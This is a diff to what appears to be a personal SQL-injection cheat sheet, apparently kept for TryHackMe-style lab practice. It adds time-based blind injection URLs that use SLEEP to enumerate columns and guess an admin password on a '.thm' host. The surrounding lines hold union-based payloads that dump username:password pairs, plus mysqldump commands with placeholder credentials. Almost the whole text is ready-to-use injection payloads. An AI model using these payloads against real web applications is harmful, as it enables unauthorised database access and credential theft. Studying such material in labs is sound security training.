@@ -43,6 +43,10 @@ searchitem=test%27+UNION+SELECT+1,2,SCHEMA_NAME+FROM+INFORMATION_SCHEMA.SCHEMATA
 searcitem=test%27+UNION+SELECT+1,2,COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA=+'db'+AND+TABLE_NAME+=+'users'--+-
 searchitem=test%27+UNION+SELECT+1,2,CONCAT(username,0x3a,pwd)+FROM+db.users--+-
 
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(2),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like '%';--
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(2),2 from users where username='admin' and password like '%';--
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(2),2 from users where username='admin' and password like '4961';--
+
 # mysql-tools
 mysqlshow -u USER -p PASS DATABASE TABLES
 mysqldump -u USER --password=PASS --single-transaction --all-databases
